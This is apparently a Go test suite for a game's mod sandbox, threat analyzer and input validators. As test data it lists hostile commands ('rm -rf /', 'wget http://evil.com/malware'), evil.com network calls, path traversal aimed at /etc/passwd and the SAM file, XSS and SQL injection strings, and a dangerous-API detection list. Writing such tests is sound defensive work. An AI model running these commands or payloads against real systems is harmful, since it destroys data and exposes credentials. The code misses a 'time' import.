// ========================================================
// Security Interface Test Suite
// セキュリティインターフェーステスト
// ========================================================

package interfaces_test

import (
	"errors"
	"fmt"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/mock"
	"muscle-dreamer/docs/reverse/interfaces"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// ========================================================
// Security Error Definitions
// ========================================================

var (
	ErrAccessDenied        = errors.New("access denied")
	ErrNetworkAccessDenied = errors.New("network access denied")
	ErrSystemAccessDenied  = errors.New("system access denied")
	ErrMaliciousScript     = errors.New("malicious script detected")
	ErrInvalidPath         = errors.New("invalid path")
	ErrStringTooLong       = errors.New("string too long")
	ErrAssetTooLarge       = errors.New("asset too large")
	ErrInvalidInput        = errors.New("invalid input")
)

// ========================================================
// Mock Security Implementations
// ========================================================

// MockModSandbox - MODサンドボックスのモック実装
type MockModSandbox struct {
	mock.Mock
	mod            *interfaces.Mod
	allowedPaths   []string
	networkAllowed bool
	systemAllowed  bool
}

func NewMockModSandbox(mod *interfaces.Mod) *MockModSandbox {
	return &MockModSandbox{
		mod:            mod,
		allowedPaths:   mod.Permissions.FileAccess,
		networkAllowed: mod.Permissions.NetworkAccess,
		systemAllowed:  mod.Permissions.SystemAccess,
	}
}

func (m *MockModSandbox) WriteFile(path string, data []byte) error {
	args := m.Called(path, data)

	// パストラバーサル検証
	if strings.Contains(path, "..") || strings.Contains(path, "\x00") {
		return ErrAccessDenied
	}

	// 絶対パス禁止
	if filepath.IsAbs(path) {
		return ErrAccessDenied
	}

	// 許可されたパス確認
	allowed := false
	for _, allowedPath := range m.allowedPaths {
		if strings.HasPrefix(path, allowedPath) {
			allowed = true
			break
		}
	}

	if !allowed {
		return ErrAccessDenied
	}

	return args.Error(0)
}

func (m *MockModSandbox) ReadFile(path string) ([]byte, error) {
	args := m.Called(path)

	// WriteFileと同じ検証ロジック
	if err := m.WriteFile(path, nil); err != nil {
		return nil, err
	}

	if args.Get(0) != nil {
		return args.Get(0).([]byte), args.Error(1)
	}

	return []byte("mock file content"), nil
}

func (m *MockModSandbox) HTTPGet(url string) error {
	args := m.Called(url)

	if !m.networkAllowed {
		return ErrNetworkAccessDenied
	}

	return args.Error(0)
}

func (m *MockModSandbox) TCPConnect(address string) error {
	args := m.Called(address)

	if !m.networkAllowed {
		return ErrNetworkAccessDenied
	}

	return args.Error(0)
}

func (m *MockModSandbox) UDPConnect(address string) error {
	args := m.Called(address)

	if !m.networkAllowed {
		return ErrNetworkAccessDenied
	}

	return args.Error(0)
}

func (m *MockModSandbox) DNSLookup(hostname string) error {
	args := m.Called(hostname)

	if !m.networkAllowed {
		return ErrNetworkAccessDenied
	}

	return args.Error(0)
}

func (m *MockModSandbox) ExecuteCommand(name string, args ...string) error {
	mockArgs := m.Called(name, args)

	if !m.systemAllowed {
		return ErrSystemAccessDenied
	}

	return mockArgs.Error(0)
}

// MockThreatAnalyzer - 脅威分析のモック実装
type MockThreatAnalyzer struct {
	mock.Mock
}

type SecurityThreat struct {
	Type        string
	Severity    string
	Description string
	Line        int
	Code        string
}

func (m *MockThreatAnalyzer) AnalyzeModSecurity(mod *interfaces.Mod) []SecurityThreat {
	args := m.Called(mod)

	var threats []SecurityThreat

	// 危険なAPIの検出
	dangerousAPIs := []string{
		"os.Exit", "os.Remove", "os.RemoveAll",
		"http.Get", "http.Post", "net.Dial",
		"exec.Command", "syscall.",
		"unsafe.", "reflect.",
	}

	for _, script := range mod.Scripts {
		for i, api := range dangerousAPIs {
			if strings.Contains(script, api) {
				threats = append(threats, SecurityThreat{
					Type:        "API_MISUSE",
					Severity:    "HIGH",
					Description: fmt.Sprintf("Dangerous API usage: %s", api),
					Line:        i + 1,
					Code:        api,
				})
			}
		}
	}

	if args.Get(0) != nil {
		return args.Get(0).([]SecurityThreat)
	}

	return threats
}

// MockConfigValidator - 設定バリデーターのモック実装
type MockConfigValidator struct {
	mock.Mock
}

func (m *MockConfigValidator) SetConfigField(config *interfaces.GameConfig, field, value string) error {
	args := m.Called(config, field, value)

	// XSS対策
	if strings.Contains(value, "<script>") {
		return ErrInvalidInput
	}

	// SQLインジェクション対策
	if strings.Contains(value, "DROP TABLE") || strings.Contains(value, "'; ") {
		return ErrInvalidInput
	}

	// パストラバーサル対策
	if strings.Contains(value, "../") {
		return ErrInvalidInput
	}

	// 長さ制限
	if len(value) > 1000 {
		return ErrStringTooLong
	}

	return args.Error(0)
}

func (m *MockConfigValidator) ValidateAssetPath(path string) error {
	args := m.Called(path)

	// パストラバーサル検証
	if strings.Contains(path, "..") {
		return ErrInvalidPath
	}

	// 絶対パス禁止
	if filepath.IsAbs(path) {
		return ErrInvalidPath
	}

	// 許可されたディレクトリ確認
	allowedDirs := []string{"assets/", "themes/"}
	allowed := false
	for _, dir := range allowedDirs {
		if strings.HasPrefix(path, dir) {
			allowed = true
			break
		}
	}

	if !allowed {
		return ErrInvalidPath
	}

	return args.Error(0)
}

// ========================================================
// MOD Security Tests
// ========================================================

// TestModSandboxSecurity - MODサンドボックスセキュリティテスト
func TestModSandboxSecurity(t *testing.T) {
	t.Run("FileAccessRestriction", func(t *testing.T) {
		mod := &interfaces.Mod{
			Name: "TestMod",
			Permissions: interfaces.ModPermissions{
				FileAccess:    []string{"mods/testmod/"},
				NetworkAccess: false,
				SystemAccess:  false,
			},
		}

		sandbox := NewMockModSandbox(mod)

		testCases := []struct {
			name       string
			path       string
			shouldFail bool
		}{
			{"許可されたパス", "mods/testmod/data.txt", false},
			{"パストラバーサル上", "../../../etc/passwd", true},
			{"パストラバーサル下", "mods/testmod/../../../etc/passwd", true},
			{"絶対パス", "/etc/passwd", true},
			{"Nullバイト", "mods/testmod/\x00../../etc/passwd", true},
			{"Windows形式", "mods\\testmod\\..\\..\\..\\windows\\system32", true},
			{"許可外ディレクトリ", "other/path/file.txt", true},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				if tc.shouldFail {
					sandbox.On("WriteFile", tc.path, mock.Anything).Return(ErrAccessDenied)
				} else {
					sandbox.On("WriteFile", tc.path, mock.Anything).Return(nil)
				}

				err := sandbox.WriteFile(tc.path, []byte("test"))

				if tc.shouldFail {
					assert.ErrorIs(t, err, ErrAccessDenied)
				} else {
					assert.NoError(t, err)
				}
			})
		}
	})

	t.Run("NetworkAccessRestriction", func(t *testing.T) {
		mod := &interfaces.Mod{
			Name: "NetworkRestrictedMod",
			Permissions: interfaces.ModPermissions{
				NetworkAccess: false,
			},
		}

		sandbox := NewMockModSandbox(mod)

		networkTests := []struct {
			name     string
			testFunc func() error
		}{
			{"HTTP GET", func() error { return sandbox.HTTPGet("http://evil.com") }},
			{"HTTPS GET", func() error { return sandbox.HTTPGet("https://evil.com") }},
			{"TCP Connect", func() error { return sandbox.TCPConnect("evil.com:80") }},
			{"UDP Connect", func() error { return sandbox.UDPConnect("evil.com:53") }},
			{"DNS Lookup", func() error { return sandbox.DNSLookup("evil.com") }},
		}

		for _, test := range networkTests {
			t.Run(test.name, func(t *testing.T) {
				err := test.testFunc()
				assert.ErrorIs(t, err, ErrNetworkAccessDenied)
			})
		}
	})

	t.Run("SystemCommandRestriction", func(t *testing.T) {
		mod := &interfaces.Mod{
			Name: "SystemRestrictedMod",
			Permissions: interfaces.ModPermissions{
				SystemAccess: false,
			},
		}

		sandbox := NewMockModSandbox(mod)

		dangerousCommands := []struct {
			name string
			cmd  string
			args []string
		}{
			{"ファイル削除", "rm", []string{"-rf", "/"}},
			{"システム情報", "cat", []string{"/etc/passwd"}},
			{"ネットワーク", "wget", []string{"http://evil.com/malware"}},
			{"シェル実行", "sh", []string{"-c", "echo pwned"}},
			{"プロセス表示", "ps", []string{"aux"}},
		}

		for _, cmd := range dangerousCommands {
			t.Run(cmd.name, func(t *testing.T) {
				err := sandbox.ExecuteCommand(cmd.cmd, cmd.args...)
				assert.ErrorIs(t, err, ErrSystemAccessDenied)
			})
		}
	})
}

// TestModStaticAnalysis - MOD静的解析テスト
func TestModStaticAnalysis(t *testing.T) {
	analyzer := &MockThreatAnalyzer{}

	t.Run("MaliciousCodeDetection", func(t *testing.T) {
		maliciousScripts := []struct {
			name   string
			script string
			threat string
		}{
			{
				"システム終了",
				"package main\nimport \"os\"\nfunc main() { os.Exit(1) }",
				"os.Exit",
			},
			{
				"ファイル削除",
				"package main\nimport \"os\"\nfunc main() { os.Remove(\"/important\") }",
				"os.Remove",
			},
			{
				"ネットワークアクセス",
				"package main\nimport \"net/http\"\nfunc main() { http.Get(\"http://evil.com\") }",
				"http.Get",
			},
			{
				"システムコマンド",
				"package main\nimport \"os/exec\"\nfunc main() { exec.Command(\"rm\", \"-rf\", \"/\").Run() }",
				"exec.Command",
			},
		}

		for _, test := range maliciousScripts {
			t.Run(test.name, func(t *testing.T) {
				mod := &interfaces.Mod{
					Name:    "MaliciousMod",
					Scripts: []string{test.script},
				}

				expectedThreats := []SecurityThreat{
					{
						Type:        "API_MISUSE",
						Severity:    "HIGH",
						Description: fmt.Sprintf("Dangerous API usage: %s", test.threat),
						Code:        test.threat,
					},
				}

				analyzer.On("AnalyzeModSecurity", mod).Return(expectedThreats)

				threats := analyzer.AnalyzeModSecurity(mod)

				assert.NotEmpty(t, threats)
				found := false
				for _, threat := range threats {
					if strings.Contains(threat.Description, test.threat) {
						found = true
						assert.Equal(t, "API_MISUSE", threat.Type)
						assert.Equal(t, "HIGH", threat.Severity)
						break
					}
				}
				assert.True(t, found, "Expected threat not found: %s", test.threat)

				analyzer.AssertExpectations(t)
			})
		}
	})

	t.Run("SafeCodeValidation", func(t *testing.T) {
		safeScripts := []string{
			"package main\nfunc main() { println(\"Hello, World!\") }",
			"package main\nimport \"fmt\"\nfunc main() { fmt.Println(\"Safe code\") }",
			"package main\nfunc calculateSum(a, b int) int { return a + b }",
		}

		for i, script := range safeScripts {
			t.Run(fmt.Sprintf("SafeScript%d", i), func(t *testing.T) {
				mod := &interfaces.Mod{
					Name:    "SafeMod",
					Scripts: []string{script},
				}

				analyzer.On("AnalyzeModSecurity", mod).Return([]SecurityThreat{})

				threats := analyzer.AnalyzeModSecurity(mod)
				assert.Empty(t, threats, "Safe code should not generate threats")

				analyzer.AssertExpectations(t)
			})
		}
	})
}

// ========================================================
// Input Validation Tests
// ========================================================

// TestInputValidation - 入力検証テスト
func TestInputValidation(t *testing.T) {
	validator := &MockConfigValidator{}

	t.Run("XSSPrevention", func(t *testing.T) {
		xssInputs := []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"javascript:alert('XSS')",
			"<iframe src=javascript:alert('XSS')></iframe>",
		}

		config := &interfaces.GameConfig{}

		for _, input := range xssInputs {
			t.Run("XSS: "+input, func(t *testing.T) {
				validator.On("SetConfigField", config, "title", input).Return(ErrInvalidInput)

				err := validator.SetConfigField(config, "title", input)
				assert.ErrorIs(t, err, ErrInvalidInput)

				validator.AssertExpectations(t)
			})
		}
	})

	t.Run("SQLInjectionPrevention", func(t *testing.T) {
		sqlInjections := []string{
			"'; DROP TABLE users; --",
			"' OR '1'='1",
			"admin'; --",
			"' UNION SELECT * FROM passwords --",
		}

		config := &interfaces.GameConfig{}

		for _, injection := range sqlInjections {
			t.Run("SQL: "+injection, func(t *testing.T) {
				validator.On("SetConfigField", config, "title", injection).Return(ErrInvalidInput)

				err := validator.SetConfigField(config, "title", injection)
				assert.ErrorIs(t, err, ErrInvalidInput)

				validator.AssertExpectations(t)
			})
		}
	})

	t.Run("PathTraversalPrevention", func(t *testing.T) {
		maliciousPaths := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\config\\sam",
			"assets/../../../secret.txt",
			"themes/../../sensitive/data.txt",
		}

		for _, path := range maliciousPaths {
			t.Run("Path: "+path, func(t *testing.T) {
				validator.On("ValidateAssetPath", path).Return(ErrInvalidPath)

				err := validator.ValidateAssetPath(path)
				assert.ErrorIs(t, err, ErrInvalidPath)

				validator.AssertExpectations(t)
			})
		}
	})

	t.Run("StringLengthValidation", func(t *testing.T) {
		config := &interfaces.GameConfig{}

		// 正常な長さ
		normalString := "Normal Game Title"
		validator.On("SetConfigField", config, "title", normalString).Return(nil)

		err := validator.SetConfigField(config, "title", normalString)
		assert.NoError(t, err)

		// 長すぎる文字列
		longString := strings.Repeat("A", 1001)
		validator.On("SetConfigField", config, "title", longString).Return(ErrStringTooLong)

		err = validator.SetConfigField(config, "title", longString)
		assert.ErrorIs(t, err, ErrStringTooLong)

		validator.AssertExpectations(t)
	})
}

// ========================================================
// Asset Security Tests
// ========================================================

// TestAssetSecurity - アセットセキュリティテスト
func TestAssetSecurity(t *testing.T) {
	validator := &MockConfigValidator{}

	t.Run("ValidAssetPaths", func(t *testing.T) {
		validPaths := []string{
			"assets/sprites/player.png",
			"assets/audio/bgm.ogg",
			"themes/default/sprites/enemy.png",
			"themes/custom/localization/en.yaml",
		}

		for _, path := range validPaths {
			t.Run("Valid: "+path, func(t *testing.T) {
				validator.On("ValidateAssetPath", path).Return(nil)

				err := validator.ValidateAssetPath(path)
				assert.NoError(t, err)

				validator.AssertExpectations(t)
			})
		}
	})

	t.Run("InvalidAssetPaths", func(t *testing.T) {
		invalidPaths := []string{
			"/etc/passwd",
			"C:\\Windows\\System32\\config\\sam",
			"config/secrets.yaml",
			"../sensitive/data.txt",
			"data/../../etc/shadow",
		}

		for _, path := range invalidPaths {
			t.Run("Invalid: "+path, func(t *testing.T) {
				validator.On("ValidateAssetPath", path).Return(ErrInvalidPath)

				err := validator.ValidateAssetPath(path)
				assert.ErrorIs(t, err, ErrInvalidPath)

				validator.AssertExpectations(t)
			})
		}
	})
}

// ========================================================
// Security Integration Tests
// ========================================================

// TestSecurityIntegration - セキュリティ統合テスト
func TestSecurityIntegration(t *testing.T) {
	t.Run("ComprehensiveModSecurity", func(t *testing.T) {
		// 悪意のあるMOD作成
		maliciousMod := &interfaces.Mod{
			Name:    "MaliciousMod",
			Version: "1.0.0",
			Scripts: []string{
				"package main\nimport \"os\"\nfunc main() { os.Remove(\"/important/file\") }",
				"package main\nimport \"net/http\"\nfunc main() { http.Get(\"http://evil.com/steal\") }",
			},
			Permissions: interfaces.ModPermissions{
				FileAccess:    []string{"mods/malicious/"},
				NetworkAccess: false,
				SystemAccess:  false,
			},
		}

		// 静的解析
		analyzer := &MockThreatAnalyzer{}
		expectedThreats := []SecurityThreat{
			{Type: "API_MISUSE", Severity: "HIGH", Description: "Dangerous API usage: os.Remove"},
			{Type: "API_MISUSE", Severity: "HIGH", Description: "Dangerous API usage: http.Get"},
		}
		analyzer.On("AnalyzeModSecurity", maliciousMod).Return(expectedThreats)

		threats := analyzer.AnalyzeModSecurity(maliciousMod)
		assert.Len(t, threats, 2)

		// サンドボックステスト
		sandbox := NewMockModSandbox(maliciousMod)

		// ファイルアクセステスト
		err := sandbox.WriteFile("../../../etc/passwd", []byte("malicious"))
		assert.ErrorIs(t, err, ErrAccessDenied)

		// ネットワークアクセステスト
		err = sandbox.HTTPGet("http://evil.com")
		assert.ErrorIs(t, err, ErrNetworkAccessDenied)

		// システムコマンドテスト
		err = sandbox.ExecuteCommand("rm", "-rf", "/")
		assert.ErrorIs(t, err, ErrSystemAccessDenied)

		analyzer.AssertExpectations(t)
	})

	t.Run("LegitimateModOperation", func(t *testing.T) {
		// 正当なMOD作成
		legitimateMod := &interfaces.Mod{
			Name:    "LegitMod",
			Version: "1.0.0",
			Scripts: []string{
				"package main\nfunc main() { println(\"Hello from mod!\") }",
			},
			Permissions: interfaces.ModPermissions{
				FileAccess:    []string{"mods/legit/"},
				NetworkAccess: false,
				SystemAccess:  false,
			},
		}

		// 静的解析 - 脅威なし
		analyzer := &MockThreatAnalyzer{}
		analyzer.On("AnalyzeModSecurity", legitimateMod).Return([]SecurityThreat{})

		threats := analyzer.AnalyzeModSecurity(legitimateMod)
		assert.Empty(t, threats)

		// サンドボックス - 許可された操作
		sandbox := NewMockModSandbox(legitimateMod)
		sandbox.On("WriteFile", "mods/legit/data.txt", mock.Anything).Return(nil)
		sandbox.On("ReadFile", "mods/legit/config.json").Return([]byte("{}"), nil)

		err := sandbox.WriteFile("mods/legit/data.txt", []byte("legitimate data"))
		assert.NoError(t, err)

		data, err := sandbox.ReadFile("mods/legit/config.json")
		assert.NoError(t, err)
		assert.NotEmpty(t, data)

		analyzer.AssertExpectations(t)
		sandbox.AssertExpectations(t)
	})
}

// ========================================================
// Performance Security Tests
// ========================================================

// TestSecurityPerformance - セキュリティパフォーマンステスト
func TestSecurityPerformance(t *testing.T) {
	t.Run("ValidationPerformance", func(t *testing.T) {
		validator := &MockConfigValidator{}
		config := &interfaces.GameConfig{}

		// 大量の入力検証
		const inputCount = 1000

		for i := 0; i < inputCount; i++ {
			input := fmt.Sprintf("test_input_%d", i)
			validator.On("SetConfigField", config, "title", input).Return(nil)
		}

		start := time.Now()
		for i := 0; i < inputCount; i++ {
			input := fmt.Sprintf("test_input_%d", i)
			validator.SetConfigField(config, "title", input)
		}
		elapsed := time.Since(start)

		// 1000回の検証 < 100ms
		assert.Less(t, elapsed, 100*time.Millisecond)

		t.Logf("Validated %d inputs in %v", inputCount, elapsed)

		validator.AssertExpectations(t)
	})

	t.Run("ThreatAnalysisPerformance", func(t *testing.T) {
		analyzer := &MockThreatAnalyzer{}

		// 大きなスクリプトを持つMOD
		largeScript := strings.Repeat("func test() { println(\"test\") }\n", 1000)
		mod := &interfaces.Mod{
			Name:    "LargeMod",
			Scripts: []string{largeScript},
		}

		analyzer.On("AnalyzeModSecurity", mod).Return([]SecurityThreat{})

		start := time.Now()
		threats := analyzer.AnalyzeModSecurity(mod)
		elapsed := time.Since(start)

		// 大きなスクリプトの分析 < 1秒
		assert.Less(t, elapsed, time.Second)
		assert.Empty(t, threats)

		t.Logf("Analyzed large script in %v", elapsed)

		analyzer.AssertExpectations(t)
	})
}
